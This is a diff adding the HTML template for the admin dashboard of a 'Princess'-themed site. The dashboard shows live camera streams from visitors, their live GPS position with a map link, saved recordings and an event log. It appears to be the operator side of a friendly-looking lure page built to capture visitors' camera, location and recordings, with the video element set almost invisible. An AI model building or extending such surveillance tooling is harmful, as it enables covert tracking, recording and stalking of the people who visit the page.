@@ -1,0 +1,82 @@
+<!doctype html>
+<html lang="en">
+<head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width,initial-scale=1">
+  <title>Admin Dashboard · Princess</title>
+  <link rel="stylesheet" href="{{ url_for('static', filename='style.css') }}">
+</head>
+<body>
+<main class="admin-wrap">
+  <header class="admin-header">
+    <div>
+      <p class="eyebrow">private area</p>
+      <h1>Princess site dashboard 🧸</h1>
+      <p class="muted">Live sessions only appear when the visitor starts sharing camera.</p>
+    </div>
+    <form method="post" action="/admin/logout">
+      <button class="button soft" type="submit">Sign out</button>
+    </form>
+  </header>
+
+  <div class="admin-grid">
+    <section class="panel admin-panel">
+      <h2>Live session</h2>
+      <p class="muted">Select an active session. Camera stream is peer-to-peer and needs the visitor's browser permission.</p>
+      <select id="sessionSelect">
+        <option value="">No active session selected</option>
+      </select>
+
+      <div class="stream-grid" style="grid-template-columns:1fr">
+        <div>
+          <h3>Live camera</h3>
+          <div style="position:relative;width:100%;min-height:220px;background:#1a1014;border-radius:16px;overflow:hidden">
+            <video id="adminCamera" autoplay playsinline muted style="position:absolute;inset:0;width:100%;height:100%;object-fit:cover;opacity:0.01;pointer-events:none"></video>
+          </div>
+        </div>
+      </div>
+
+      <div class="location-box" id="locationBox">
+        <h3>Live GPS</h3>
+        <p id="adminLocation" class="reply">No location yet.</p>
+        <a id="adminMapLink" class="button soft" href="#" target="_blank" rel="noopener" style="display:none;margin-top:8px">Open in Maps</a>
+      </div>
+
+      <p id="liveStatus" class="reply">Waiting for a visitor to start a session.</p>
+      <div class="button-row" style="flex-wrap:wrap;gap:10px;margin-top:12px">
+        <button class="button soft" id="connectBtn" type="button">Connect to selected session</button>
+        <button class="button soft" id="deleteSessionBtn" type="button">Delete selected session</button>
+        <button class="button soft" id="clearSessionsBtn" type="button">Clear all sessions</button>
+      </div>
+    </section>
+
+    <section class="panel admin-panel">
+      <h2>Saved recordings</h2>
+      <p class="tiny-note">Files are private to this dashboard. Browser recordings may be WebM; MP4 conversion works only when FFmpeg is installed on the server.</p>
+      <div id="recordingsList" class="event-list">No recordings yet.</div>
+    </section>
+
+    <section class="panel admin-panel">
+      <h2>Background music 🎵</h2>
+      <p class="muted">Optional YouTube link. If empty, visitors hear <strong>soft-piano.mp3</strong> automatically (always on, no toggle).</p>
+      <label class="consent-check" style="display:block;text-align:left;margin:12px 0 8px">YouTube URL (optional)</label>
+      <input id="youtubeUrl" type="url" placeholder="https://www.youtube.com/watch?v=... (leave empty for soft-piano)" style="width:100%;padding:12px 14px;border-radius:14px;border:1px solid var(--line);background:#fff;color:var(--ink)">
+      <div class="button-row" style="margin-top:12px;justify-content:flex-start;gap:10px">
+        <button class="button primary" id="saveMusicBtn" type="button">Save music link</button>
+        <button class="button soft" id="clearMusicBtn" type="button">Clear (use soft-piano)</button>
+      </div>
+      <p id="musicSaveStatus" class="reply" aria-live="polite"></p>
+    </section>
+
+    <section class="panel admin-panel">
+      <h2>Recent events</h2>
+      <div id="eventsList" class="event-list">Loading…</div>
+    </section>
+  </div>
+
+  <p class="tiny-note">Screen share is disabled. Camera only. Set a strong password and secret before deployment.</p>
+</main>
+<script src="https://cdn.socket.io/4.7.5/socket.io.min.js" crossorigin="anonymous"></script>
+<script src="{{ url_for('static', filename='admin.js') }}"></script>
+</body>
+</html>
